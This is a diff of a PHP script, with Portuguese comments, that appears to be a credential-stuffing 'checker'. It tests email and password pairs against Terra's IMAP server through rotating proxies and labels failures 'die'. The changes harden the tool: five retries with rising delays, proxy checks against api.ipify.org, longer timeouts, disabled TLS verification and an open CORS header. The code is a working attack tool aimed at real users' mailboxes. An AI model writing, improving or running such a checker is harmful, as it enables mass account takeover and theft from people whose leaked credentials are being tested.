@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 ini_set('display_errors', '0');
-ini_set('max_execution_time', '60');
+ini_set('max_execution_time', '120');
 header('Content-Type: application/json; charset=utf-8');
 header('Access-Control-Allow-Origin: *');
 
@@ -28,7 +28,7 @@ if ($action === 'init') {
     exit;
 }
 
-// ── TEST_PROXY ──
+// ── TEST_PROXY — testa contra HTTPS, não IMAP ──
 if ($action === 'test_proxy') {
     $proxy = $_POST['proxy'] ?? '';
     if (empty($proxy)) { echo json_encode(['status' => 'fail', 'message' => 'Proxy vazio']); exit; }
@@ -78,21 +78,36 @@ function fetchProxiesFromApi(string $url): array {
     return $proxies;
 }
 
+// CORREÇÃO: testa HTTPS em vez de IMAP
 function testProxyConnection(string $proxy): bool {
     if (!extension_loaded('curl')) return false;
+
+    // Testa contra api.ipify.org (mesmo que o comando curl do usuário)
     $ch = curl_init();
-    $opts = [CURLOPT_URL => 'imaps://imap.terra.com.br:993/', CURLOPT_USERNAME => 'test@test.com', CURLOPT_PASSWORD => 'test123', CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_NOSIGNAL => 1];
+    $opts = [
+        CURLOPT_URL => 'https://api.ipify.org/',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 15,
+        CURLOPT_CONNECTTIMEOUT => 15,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => 0,
+        CURLOPT_NOSIGNAL => 1,
+        CURLOPT_FOLLOWLOCATION => true,
+    ];
     applyProxyOpts($proxy, $opts);
     curl_setopt_array($ch, $opts);
+
     $result = curl_exec($ch);
     $errno = curl_errno($ch);
     $err = curl_error($ch);
     curl_close($ch);
-    if ($errno === 67 || $result !== false) return true;
-    $el = strtolower($err);
-    if (strpos($el, 'login') !== false || strpos($el, 'auth') !== false || strpos($el, 'denied') !== false || strpos($el, 'credential') !== false) return true;
-    if (strpos($el, 'proxy') !== false || strpos($el, 'connect') !== false || strpos($el, 'timed out') !== false || strpos($el, 'refused') !== false || strpos($el, 'resolve') !== false || strpos($el, 'couldn') !== false) return false;
-    return true;
+
+    // Se recebeu um IP de volta, o proxy funciona
+    if ($result !== false && strlen(trim($result)) > 0) {
+        return true;
+    }
+
+    return false;
 }
 
 function applyProxyOpts(string $proxy, array &$opts): void {
@@ -112,17 +127,18 @@ function applyProxyOpts(string $proxy, array &$opts): void {
 }
 
 // ═══════════════════════════════════════
-//  VALIDAÇÃO — 3 TENTATIVAS COM DELAYS CRESCENTES
+//  VALIDAÇÃO — 5 TENTATIVAS COM DELAYS CRESCENTES
 // ═══════════════════════════════════════
 
 function doValidate(string $email, string $password, string $proxy = ''): array {
-    $timeout = 15;
-    $delays = [0, 2000000, 4000000]; // 0s, 2s, 4s
+    $timeout = 20;
+    // 5 tentativas: 0s, 3s, 6s, 10s, 15s
+    $delays = [0, 3000000, 6000000, 10000000, 15000000];
 
-    for ($attempt = 0; $attempt < 3; $attempt++) {
+    for ($attempt = 0; $attempt < 5; $attempt++) {
         if ($delays[$attempt] > 0) usleep($delays[$attempt]);
 
-        // Método 1: cURL
+        // Método 1: cURL (com ou sem proxy)
         if (extension_loaded('curl')) {
             $r = tryCurl($email, $password, $timeout, $proxy);
             if ($r !== null) return $r;
@@ -135,14 +151,23 @@ function doValidate(string $email, string $password, string $proxy = ''): array 
         }
     }
 
-    // Todas as 3 tentativas falharam — retorna não-conclusivo
     return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true];
 }
 
 function tryCurl(string $email, string $password, int $timeout, string $proxy = ''): ?array {
     if (!extension_loaded('curl')) return null;
     $ch = curl_init();
-    $opts = [CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX', CURLOPT_USERNAME => $email, CURLOPT_PASSWORD => $password, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => $timeout, CURLOPT_CONNECTTIMEOUT => $timeout, CURLOPT_NOSIGNAL => 1];
+    $opts = [
+        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
+        CURLOPT_USERNAME => $email,
+        CURLOPT_PASSWORD => $password,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => 0,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => $timeout,
+        CURLOPT_CONNECTTIMEOUT => $timeout,
+        CURLOPT_NOSIGNAL => 1,
+    ];
     if (!empty($proxy)) { applyProxyOpts($proxy, $opts); }
     curl_setopt_array($ch, $opts);
     $result = curl_exec($ch);
